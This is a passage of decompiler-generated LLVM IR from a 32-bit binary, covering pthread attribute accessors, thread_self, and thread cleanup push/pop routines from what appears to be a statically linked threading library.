  br label %dec_label_pc_8058e18

dec_label_pc_8058e18:                             ; preds = %entry, %dec_label_pc_8058e0f
  %v0_8058e18 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8058e0f ]
  ret i32 %v0_8058e18

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8058e18, { 1, 0 }
}

define i32 @pthread_attr_getinheritsched(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8058e1d = add i32 %arg1, 12
  %v2_8058e1d = inttoptr i32 %v1_8058e1d to i32*
  %v3_8058e1d = load i32, i32* %v2_8058e1d, align 4
  store i32 %v3_8058e1d, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setscope(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8058e2d = icmp eq i32 %arg2, 0
  br i1 %v1_8058e2d, label %dec_label_pc_8058e40, label %dec_label_pc_8058e31

dec_label_pc_8058e31:                             ; preds = %entry
  %v8_8058e31 = icmp eq i32 %arg2, 1
  %v1_8058e3c = select i1 %v8_8058e31, i32 95, i32 22
  ret i32 %v1_8058e3c

dec_label_pc_8058e40:                             ; preds = %entry
  %v1_8058e44 = add i32 %arg1, 16
  %v2_8058e44 = inttoptr i32 %v1_8058e44 to i32*
  store i32 0, i32* %v2_8058e44, align 4
  ret i32 0
}

define i32 @pthread_attr_getscope(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8058e52 = add i32 %arg1, 16
  %v2_8058e52 = inttoptr i32 %v1_8058e52 to i32*
  %v3_8058e52 = load i32, i32* %v2_8058e52, align 4
  store i32 %v3_8058e52, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_getguardsize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8058e62 = add i32 %arg1, 20
  %v2_8058e62 = inttoptr i32 %v1_8058e62 to i32*
  %v3_8058e62 = load i32, i32* %v2_8058e62, align 4
  store i32 %v3_8058e62, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstackaddr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_8058e76 = add i32 %arg1, 28
  %v3_8058e76 = inttoptr i32 %v2_8058e76 to i32*
  store i32 %arg2, i32* %v3_8058e76, align 4
  %v0_8058e7b = load i32, i32* %edx.global-to-local, align 4
  %v1_8058e7b = add i32 %v0_8058e7b, 24
  %v2_8058e7b = inttoptr i32 %v1_8058e7b to i32*
  store i32 1, i32* %v2_8058e7b, align 4
  ret i32 0
}

define i32 @__pthread_attr_getstackaddr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8058e87 = add i32 %arg1, 28
  %v2_8058e87 = inttoptr i32 %v1_8058e87 to i32*
  %v3_8058e87 = load i32, i32* %v2_8058e87, align 4
  store i32 %v3_8058e87, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstacksize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp ult i32 %arg2, 16384
  br i1 %tmp3, label %dec_label_pc_8058ead, label %dec_label_pc_8058ea4

dec_label_pc_8058ea4:                             ; preds = %entry
  %v2_8058ea8 = add i32 %arg1, 32
  %v3_8058ea8 = inttoptr i32 %v2_8058ea8 to i32*
  store i32 %arg2, i32* %v3_8058ea8, align 4
  br label %dec_label_pc_8058ead

dec_label_pc_8058ead:                             ; preds = %entry, %dec_label_pc_8058ea4
  %v0_8058ead = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8058ea4 ]
  ret i32 %v0_8058ead

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8058ead, { 1, 0 }
}

define i32 @__pthread_attr_getstacksize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8058eb2 = add i32 %arg1, 32
  %v2_8058eb2 = inttoptr i32 %v1_8058eb2 to i32*
  %v3_8058eb2 = load i32, i32* %v2_8058eb2, align 4
  store i32 %v3_8058eb2, i32* %arg2, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_init(i32* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058ebe = load i32, i32* @ebx, align 4
  store i32 %v0_8058ebe, i32* %stack_var_-4, align 4
  %v1_8058ec2 = call i32 @__GI_getpagesize(i32 %v0_8058ebe)
  store i32 %tmp1, i32* %ebx.global-to-local, align 4
  %v2_8058ed0 = sub i32 2097152, %v1_8058ec2
  store i32 %v2_8058ed0, i32* %edx.global-to-local, align 4
  %v2_8058ed2 = add i32 %tmp1, 20
  %v3_8058ed2 = inttoptr i32 %v2_8058ed2 to i32*
  store i32 %v1_8058ec2, i32* %v3_8058ed2, align 4
  %v0_8058ed5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058ed5 = inttoptr i32 %v0_8058ed5 to i32*
  store i32 0, i32* %v1_8058ed5, align 4
  %v0_8058edb = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058edb = add i32 %v0_8058edb, 4
  %v2_8058edb = inttoptr i32 %v1_8058edb to i32*
  store i32 0, i32* %v2_8058edb, align 4
  %v0_8058ee2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058ee2 = add i32 %v0_8058ee2, 8
  %v2_8058ee2 = inttoptr i32 %v1_8058ee2 to i32*
  store i32 0, i32* %v2_8058ee2, align 4
  %v0_8058ee9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058ee9 = add i32 %v0_8058ee9, 12
  %v2_8058ee9 = inttoptr i32 %v1_8058ee9 to i32*
  store i32 1, i32* %v2_8058ee9, align 4
  %v0_8058ef0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058ef0 = add i32 %v0_8058ef0, 16
  %v2_8058ef0 = inttoptr i32 %v1_8058ef0 to i32*
  store i32 0, i32* %v2_8058ef0, align 4
  %v0_8058ef7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058ef7 = add i32 %v0_8058ef7, 28
  %v2_8058ef7 = inttoptr i32 %v1_8058ef7 to i32*
  store i32 0, i32* %v2_8058ef7, align 4
  %v0_8058efe = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058efe = add i32 %v0_8058efe, 24
  %v2_8058efe = inttoptr i32 %v1_8058efe to i32*
  store i32 0, i32* %v2_8058efe, align 4
  %v0_8058f05 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058f05 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058f05 = add i32 %v1_8058f05, 32
  %v3_8058f05 = inttoptr i32 %v2_8058f05 to i32*
  store i32 %v0_8058f05, i32* %v3_8058f05, align 4
  %v2_8058f0a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8058f0a, i32* %edx.global-to-local, align 4
  %v2_8058f0c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058f0c, i32* %ebx.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 2097152, { 1, 0, 3, 2 }
}

define i32 @__pthread_attr_setguardsize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8058f0f = load i32, i32* @ebx, align 4
  %v1_8058f13 = call i32 @__GI_getpagesize(i32 %v0_8058f0f)
  %v3_8058f22 = add i32 %arg2, -1
  %v4_8058f22 = add i32 %v3_8058f22, %v1_8058f13
  %tmp7 = urem i32 %v4_8058f22, %v1_8058f13
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8058f33 = sub i32 %v4_8058f22, %tmp7
  %v2_8058f36 = add i32 %arg1, 32
  %v3_8058f36 = inttoptr i32 %v2_8058f36 to i32*
  %v4_8058f36 = load i32, i32* %v3_8058f36, align 4
  %v10_8058f36 = icmp ult i32 %v4_8058f33, %v4_8058f36
  %v1_8058f39 = icmp eq i1 %v10_8058f36, false
  br i1 %v1_8058f39, label %dec_label_pc_8058f40, label %dec_label_pc_8058f3b

dec_label_pc_8058f3b:                             ; preds = %entry
  %v2_8058f3b = add i32 %arg1, 20
  %v3_8058f3b = inttoptr i32 %v2_8058f3b to i32*
  store i32 %v4_8058f33, i32* %v3_8058f3b, align 4
  %v10_8058f3e = load i32, i32* %eax.global-to-local, align 4
  %v11_8058f3e = and i32 %v10_8058f3e, -256
  store i32 %v11_8058f3e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058f40

dec_label_pc_8058f40:                             ; preds = %entry, %dec_label_pc_8058f3b
  %v0_8058f43 = phi i32 [ 22, %entry ], [ %v11_8058f3e, %dec_label_pc_8058f3b ]
  ret i32 %v0_8058f43

; uselistorder directives
  uselistorder label %dec_label_pc_8058f40, { 1, 0 }
}

define i32 @__GI_pthread_attr_getschedparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8058f4d = add i32 %arg1, 8
  %v3_8058f55 = inttoptr i32 %arg2 to i16*
  %v4_8058f55 = call i32 @memcpy(i16* %v3_8058f55, i32 %v1_8058f4d, i32 4)
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedparam(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  %v1_8058f6e = add i32 %arg1, 4
  %v2_8058f6e = inttoptr i32 %v1_8058f6e to i32*
  %v3_8058f6e = load i32, i32* %v2_8058f6e, align 4
  %v1_8058f71 = call i32 @sched_get_priority_max(i32 %v3_8058f6e)
  store i32 %v1_8058f71, i32* @ebx, align 4
  %v0_8058f79 = load i32, i32* @esi, align 4
  %v1_8058f79 = add i32 %v0_8058f79, 4
  %v2_8058f79 = inttoptr i32 %v1_8058f79 to i32*
  %v3_8058f79 = load i32, i32* %v2_8058f79, align 4
  %v1_8058f7c = call i32 @sched_get_priority_min(i32 %v3_8058f79)
  %v0_8058f81 = load i32, i32* @edi, align 4
  %v1_8058f81 = inttoptr i32 %v0_8058f81 to i32*
  %v2_8058f81 = load i32, i32* %v1_8058f81, align 4
  %v5_8058f88 = icmp slt i32 %v2_8058f81, %v1_8058f7c
  br i1 %v5_8058f88, label %dec_label_pc_8058fa2, label %dec_label_pc_8058f8a

dec_label_pc_8058f8a:                             ; preds = %entry
  %v1_8058f8a = load i32, i32* @ebx, align 4
  %v8_8058f8c = icmp sgt i32 %v2_8058f81, %v1_8058f8a
  br i1 %v8_8058f8c, label %dec_label_pc_8058fa2, label %dec_label_pc_8058f8e

dec_label_pc_8058f8e:                             ; preds = %dec_label_pc_8058f8a
  %v0_8058f8f = load i32, i32* @esi, align 4
  %v1_8058f8f = add i32 %v0_8058f8f, 8
  %v3_8058f96 = inttoptr i32 %v1_8058f8f to i16*
  %v4_8058f96 = call i32 @memcpy(i16* %v3_8058f96, i32 %v0_8058f81, i32 4)
  br label %dec_label_pc_8058fa7

dec_label_pc_8058fa2:                             ; preds = %dec_label_pc_8058f8a, %entry
  br label %dec_label_pc_8058fa7

dec_label_pc_8058fa7:                             ; preds = %dec_label_pc_8058f8e, %dec_label_pc_8058fa2
  %v0_8058faa = phi i32 [ 0, %dec_label_pc_8058f8e ], [ 22, %dec_label_pc_8058fa2 ]
  ret i32 %v0_8058faa

; uselistorder directives
  uselistorder label %dec_label_pc_8058fa7, { 1, 0 }
}

define i32 @thread_self.8(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8058fac = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8058fac, i32* @edx, align 4
  %v0_8058fb3 = load i32, i32* @esp, align 4
  %v1_8058fb3 = load i32, i32* @global_var_8078e6c.615, align 4
  %v7_8058fb3 = icmp ult i32 %v0_8058fb3, %v1_8058fb3
  %v1_8058fb9 = icmp eq i1 %v7_8058fb3, false
  br i1 %v1_8058fb9, label %dec_label_pc_8058fea, label %dec_label_pc_8058fbb

dec_label_pc_8058fbb:                             ; preds = %entry
  %v1_8058fbb = load i32, i32* @global_var_8078e70.616, align 16
  %v7_8058fbb = icmp ult i32 %v0_8058fb3, %v1_8058fbb
  br i1 %v7_8058fbb, label %dec_label_pc_8058fd0, label %dec_label_pc_8058fc3

dec_label_pc_8058fc3:                             ; preds = %dec_label_pc_8058fbb
  %v1_8058fc8 = load i32, i32* @global_var_8078e74.618, align 4
  %v7_8058fc8 = icmp ult i32 %v0_8058fb3, %v1_8058fc8
  br i1 %v7_8058fc8, label %dec_label_pc_8058fea, label %dec_label_pc_8058fd0

dec_label_pc_8058fd0:                             ; preds = %dec_label_pc_8058fc3, %dec_label_pc_8058fbb
  %v0_8058fd0 = load i32, i32* @global_var_807e578.619, align 8
  %v1_8058fd0 = icmp eq i32 %v0_8058fd0, 0
  br i1 %v1_8058fd0, label %dec_label_pc_8058fde, label %dec_label_pc_8058fd9

dec_label_pc_8058fd9:                             ; preds = %dec_label_pc_8058fd0
  %v0_8058fd9 = call i32 @__pthread_find_self()
  br label %dec_label_pc_8058fde

dec_label_pc_8058fde:                             ; preds = %dec_label_pc_8058fd0, %dec_label_pc_8058fd9
  %v3_8058fde = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_8058fde, i32* @edx, align 4
  %v2_8058fe4 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8058fea

dec_label_pc_8058fea:                             ; preds = %dec_label_pc_8058fc3, %entry, %dec_label_pc_8058fde
  %v0_8058fea = phi i32 [ ptrtoint (i32* @global_var_8074340.617 to i32), %dec_label_pc_8058fc3 ], [ ptrtoint (i32* @global_var_8074160 to i32), %entry ], [ %v2_8058fe4, %dec_label_pc_8058fde ]
  ret i32 %v0_8058fea

; uselistorder directives
  uselistorder label %dec_label_pc_8058fea, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058fde, { 1, 0 }
}

define i32 @__pthread_perform_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8058fec = load i32, i32* @esi, align 4
  %v0_8058fed = load i32, i32* @ebx, align 4
  store i32 %v0_8058fed, i32* %stack_var_-12, align 4
  %v1_8058fee = call i32 @thread_self.8(i32 %v0_8058fed)
  store i32 %v1_8058fee, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %v1_8058fee, i32* %esi.global-to-local, align 4
  %v1_8058ff9 = add i32 %v1_8058fee, 60
  %v2_8058ff9 = inttoptr i32 %v1_8058ff9 to i32*
  %v3_8058ff9 = load i32, i32* %v2_8058ff9, align 4
  store i32 %v3_8058ff9, i32* %ebx.global-to-local, align 4
  %v1_80590102 = icmp eq i32 %v3_8058ff9, 0
  %v1_80590129 = icmp eq i1 %v1_80590102, false
  br i1 %v1_80590129, label %dec_label_pc_8058ffe.lr.ph, label %dec_label_pc_8059014

dec_label_pc_8058ffe.lr.ph:                       ; preds = %entry
  %tmp = icmp ugt i32 %v3_8058ff9, %arg1
  br i1 %tmp, label %dec_label_pc_8059002.lr.ph, label %dec_label_pc_8059014.loopexit

dec_label_pc_8059002.lr.ph:                       ; preds = %dec_label_pc_8058ffe.lr.ph
  br label %dec_label_pc_8059002

dec_label_pc_8059002:                             ; preds = %dec_label_pc_8059002.dec_label_pc_8058ffe_crit_edge, %dec_label_pc_8059002.lr.ph
  %v4_805900828 = phi i32 [ %v3_8058ff9, %dec_label_pc_8059002.lr.ph ], [ %v3_805900a, %dec_label_pc_8059002.dec_label_pc_8058ffe_crit_edge ]
  %v5_8059008 = inttoptr i32 %v4_805900828 to i32*
  %v6_8059008 = load i32, i32* %v5_8059008, align 4
  call void @__pseudo_call(i32 %v6_8059008)
  %v0_805900a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805900a = add i32 %v0_805900a, 12
  %v2_805900a = inttoptr i32 %v1_805900a to i32*
  %v3_805900a = load i32, i32* %v2_805900a, align 4
  store i32 %v3_805900a, i32* %ebx.global-to-local, align 4
  %v1_8059010 = icmp eq i32 %v3_805900a, 0
  %v1_8059012 = icmp eq i1 %v1_8059010, false
  br i1 %v1_8059012, label %dec_label_pc_8059002.dec_label_pc_8058ffe_crit_edge, label %dec_label_pc_8059014.loopexit

dec_label_pc_8059002.dec_label_pc_8058ffe_crit_edge: ; preds = %dec_label_pc_8059002
  %v1_8058ffe.pre = load i32, i32* %edi.global-to-local, align 4
  %tmp31 = icmp ugt i32 %v3_805900a, %v1_8058ffe.pre
  br i1 %tmp31, label %dec_label_pc_8059002, label %dec_label_pc_8059014.loopexit

dec_label_pc_8059014.loopexit:                    ; preds = %dec_label_pc_8059002.dec_label_pc_8058ffe_crit_edge, %dec_label_pc_8058ffe.lr.ph, %dec_label_pc_8059002
  %v0_8059014.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8059014

dec_label_pc_8059014:                             ; preds = %dec_label_pc_8059014.loopexit, %entry
  %v0_8059014 = phi i32 [ %v0_8059014.pre, %dec_label_pc_8059014.loopexit ], [ %v1_8058fee, %entry ]
  %v1_8059014 = add i32 %v0_8059014, 372
  %v2_8059014 = inttoptr i32 %v1_8059014 to i32*
  %v3_8059014 = load i32, i32* %v2_8059014, align 4
  %v4_8059014 = icmp eq i32 %v3_8059014, 0
  br i1 %v4_8059014, label %dec_label_pc_8059014.dec_label_pc_8059025_crit_edge, label %dec_label_pc_805901d

dec_label_pc_8059014.dec_label_pc_8059025_crit_edge: ; preds = %dec_label_pc_8059014
  %v0_8059028.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059025

dec_label_pc_805901d:                             ; preds = %dec_label_pc_8059014
  %v2_805901d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805901d, i32* @ebx, align 4
  %v2_805901e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805901e, i32* @esi, align 4
  store i32 %v0_8058fec, i32* @edi, align 4
  %v0_8059020 = call i32 @__rpc_thread_destroy()
  store i32 %v0_8059020, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059025

dec_label_pc_8059025:                             ; preds = %dec_label_pc_8059014.dec_label_pc_8059025_crit_edge, %dec_label_pc_805901d
  %v0_8059028 = phi i32 [ %v0_8059028.pre, %dec_label_pc_8059014.dec_label_pc_8059025_crit_edge ], [ %v0_8059020, %dec_label_pc_805901d ]
  %v2_8059025 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8059025, i32* @ebx, align 4
  %v2_8059026 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059026, i32* @esi, align 4
  store i32 %v0_8058fec, i32* @edi, align 4
  ret i32 %v0_8059028

; uselistorder directives
  uselistorder i32 %v3_805900a, { 0, 2, 3, 1 }
  uselistorder i32 %v3_8058ff9, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8058fec, { 1, 0 }
  uselistorder label %dec_label_pc_8059025, { 1, 0 }
  uselistorder label %dec_label_pc_8059014.loopexit, { 0, 2, 1 }
}

define i32 @__pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059029 = load i32, i32* @ebx, align 4
  store i32 %v0_8059029, i32* %stack_var_-4, align 4
  %v1_805902d = call i32 @thread_self.8(i32 %v0_8059029)
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %v1_805902d, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %arg1, align 4
  %v2_8059042 = add i32 %tmp3, 4
  %v3_8059042 = inttoptr i32 %v2_8059042 to i32*
  store i32 %arg3, i32* %v3_8059042, align 4
  %v0_8059045 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059045 = add i32 %v0_8059045, 65
  %v2_8059045 = inttoptr i32 %v1_8059045 to i8*
  %v3_8059045 = load i8, i8* %v2_8059045, align 1
  %v4_8059045 = sext i8 %v3_8059045 to i32
  %v1_8059049 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059049 = add i32 %v1_8059049, 8
  %v3_8059049 = inttoptr i32 %v2_8059049 to i32*
  store i32 %v4_8059045, i32* %v3_8059049, align 4
  %v0_805904c = load i32, i32* %edx.global-to-local, align 4
  %v1_805904c = add i32 %v0_805904c, 60
  %v2_805904c = inttoptr i32 %v1_805904c to i32*
  %v3_805904c = load i32, i32* %v2_805904c, align 4
  %v1_805904f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805904f = add i32 %v1_805904f, 12
  %v3_805904f = inttoptr i32 %v2_805904f to i32*
  store i32 %v3_805904c, i32* %v3_805904f, align 4
  %v1_8059052 = icmp eq i32 %v3_805904c, 0
  br i1 %v1_8059052, label %dec_label_pc_8059061, label %dec_label_pc_8059056

dec_label_pc_8059056:                             ; preds = %entry
  %v0_8059056 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8059056 = icmp ult i32 %v0_8059056, %v3_805904c
  br i1 %v7_8059056, label %dec_label_pc_8059061, label %dec_label_pc_805905a

dec_label_pc_805905a:                             ; preds = %dec_label_pc_8059056
  %v1_805905a = add i32 %v0_8059056, 12
  %v2_805905a = inttoptr i32 %v1_805905a to i32*
  store i32 0, i32* %v2_805905a, align 4
  br label %dec_label_pc_8059061

dec_label_pc_8059061:                             ; preds = %dec_label_pc_8059056, %entry, %dec_label_pc_805905a
  %v0_8059061 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059061 = add i32 %v0_8059061, 65
  %v2_8059061 = inttoptr i32 %v1_8059061 to i8*
  store i8 0, i8* %v2_8059061, align 1
  %v0_8059065 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059065 = load i32, i32* %edx.global-to-local, align 4
  %v2_8059065 = add i32 %v1_8059065, 60
  %v3_8059065 = inttoptr i32 %v2_8059065 to i32*
  store i32 %v0_8059065, i32* %v3_8059065, align 4
  %v2_8059068 = load i32, i32* %stack_var_-12, align 4
  %v2_805906a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805906a, i32* @ebx, align 4
  ret i32 %v2_8059068

; uselistorder directives
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_8059061, { 2, 0, 1 }
}

define i32 @_pthread_cleanup_pop(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  %v4_8059074 = icmp eq i32 %arg2, 0
  br i1 %v4_8059074, label %dec_label_pc_8059086, label %dec_label_pc_805907b

dec_label_pc_805907b:                             ; preds = %entry
  %v6_8059081 = load i32, i32* %arg1, align 4
  call void @__pseudo_call(i32 %v6_8059081)
  br label %dec_label_pc_8059086

dec_label_pc_8059086:                             ; preds = %entry, %dec_label_pc_805907b
  %v0_8059086 = phi i32 [ %tmp7, %entry ], [ 134582403, %dec_label_pc_805907b ]
  %v1_8059086 = call i32 @thread_self.8(i32 %v0_8059086)
  %v0_805908b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805908b = add i32 %v0_805908b, 12
  %v2_805908b = inttoptr i32 %v1_805908b to i32*
  %v3_805908b = load i32, i32* %v2_805908b, align 4
  %v2_805908e = add i32 %v1_8059086, 60
  %v3_805908e = inttoptr i32 %v2_805908e to i32*
  store i32 %v3_805908b, i32* %v3_805908e, align 4
  %v2_8059091 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059091, i32* @ecx, align 4
  ret i32 %v1_8059086

; uselistorder directives
  uselistorder label %dec_label_pc_8059086, { 1, 0 }
}

define i32 @_pthread_cleanup_push(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059095 = load i32, i32* @ebx, align 4
  store i32 %v0_8059095, i32* %stack_var_-4, align 4
  %v1_8059099 = call i32 @thread_self.8(i32 %v0_8059095)
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %v1_8059099, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %arg1, align 4
  %v2_80590ae = add i32 %tmp3, 4
  %v3_80590ae = inttoptr i32 %v2_80590ae to i32*
  store i32 %arg3, i32* %v3_80590ae, align 4
  %v0_80590b1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80590b1 = add i32 %v0_80590b1, 60
  %v2_80590b1 = inttoptr i32 %v1_80590b1 to i32*
  %v3_80590b1 = load i32, i32* %v2_80590b1, align 4
  %v1_80590b4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80590b4 = add i32 %v1_80590b4, 12
  %v3_80590b4 = inttoptr i32 %v2_80590b4 to i32*
  store i32 %v3_80590b1, i32* %v3_80590b4, align 4
  %v1_80590b7 = icmp eq i32 %v3_80590b1, 0
  br i1 %v1_80590b7, label %dec_label_pc_80590c6, label %dec_label_pc_80590bb

dec_label_pc_80590bb:                             ; preds = %entry
  %v0_80590bb = load i32, i32* %ebx.global-to-local, align 4
  %v7_80590bb = icmp ult i32 %v0_80590bb, %v3_80590b1
  br i1 %v7_80590bb, label %dec_label_pc_80590c6, label %dec_label_pc_80590bf

dec_label_pc_80590bf:                             ; preds = %dec_label_pc_80590bb
  %v1_80590bf = add i32 %v0_80590bb, 12
  %v2_80590bf = inttoptr i32 %v1_80590bf to i32*
  store i32 0, i32* %v2_80590bf, align 4
  br label %dec_label_pc_80590c6

dec_label_pc_80590c6:                             ; preds = %dec_label_pc_80590bb, %entry, %dec_label_pc_80590bf
  %v0_80590c6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80590c6 = load i32, i32* %edx.global-to-local, align 4
  %v2_80590c6 = add i32 %v1_80590c6, 60
  %v3_80590c6 = inttoptr i32 %v2_80590c6 to i32*
  store i32 %v0_80590c6, i32* %v3_80590c6, align 4
  %v2_80590c9 = load i32, i32* %stack_var_-12, align 4
  %v2_80590cb = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80590cb, i32* @ebx, align 4
  ret i32 %v2_80590c9

; uselistorder directives
  uselistorder label %dec_label_pc_80590c6, { 2, 0, 1 }
}

define i32 @__pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80590ce = load i32, i32* @ebx, align 4
  store i32 %v0_80590ce, i32* %stack_var_-8, align 4
  %v15_80590cf = ptrtoint i32* %stack_var_-12 to i32
  %v1_80590d2 = call i32 @thread_self.8(i32 %v0_80590ce)
  store i32 %v1_80590d2, i32* %eax.global-to-local, align 4
  store i32 %tmp4, i32* @esi, align 4
  store i32 %v1_80590d2, i32* @ebx, align 4
  %v4_80590dd = icmp eq i32 %arg2, 0
  br i1 %v4_80590dd, label %dec_label_pc_80590ef, label %dec_label_pc_80590e4

dec_label_pc_80590e4:                             ; preds = %entry
  %v6_80590ea = load i32, i32* %arg1, align 4
  call void @__pseudo_call(i32 %v6_80590ea)
  %v0_80590ef.pre = load i32, i32* @esi, align 4
  %v1_80590f2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80590ef

dec_label_pc_80590ef:                             ; preds = %entry, %dec_label_pc_80590e4
  %v1_80590f2 = phi i32 [ %v1_80590d2, %entry ], [ %v1_80590f2.pre, %dec_label_pc_80590e4 ]
  %v0_80590ef = phi i32 [ %tmp4, %entry ], [ %v0_80590ef.pre, %dec_label_pc_80590e4 ]
  %v1_80590ef = add i32 %v0_80590ef, 12
  %v2_80590ef = inttoptr i32 %v1_80590ef to i32*
  %v3_80590ef = load i32, i32* %v2_80590ef, align 4
  store i32 %v3_80590ef, i32* %eax.global-to-local, align 4
  %v2_80590f2 = add i32 %v1_80590f2, 60
  %v3_80590f2 = inttoptr i32 %v2_80590f2 to i32*
  store i32 %v3_80590ef, i32* %v3_80590f2, align 4
  %v0_80590f5 = load i32, i32* @esi, align 4
  %v1_80590f5 = add i32 %v0_80590f5, 8
  %v2_80590f5 = inttoptr i32 %v1_80590f5 to i32*
  %v3_80590f5 = load i32, i32* %v2_80590f5, align 4
  store i32 %v3_80590f5, i32* %eax.global-to-local, align 4
  %v1_80590f8 = trunc i32 %v3_80590f5 to i8
  %v2_80590f8 = load i32, i32* @ebx, align 4
  %v3_80590f8 = add i32 %v2_80590f8, 65
  %v4_80590f8 = inttoptr i32 %v3_80590f8 to i8*
  store i8 %v1_80590f8, i8* %v4_80590f8, align 1
  %v0_80590fb = load i32, i32* @ebx, align 4
  %v1_80590fb = add i32 %v0_80590fb, 66
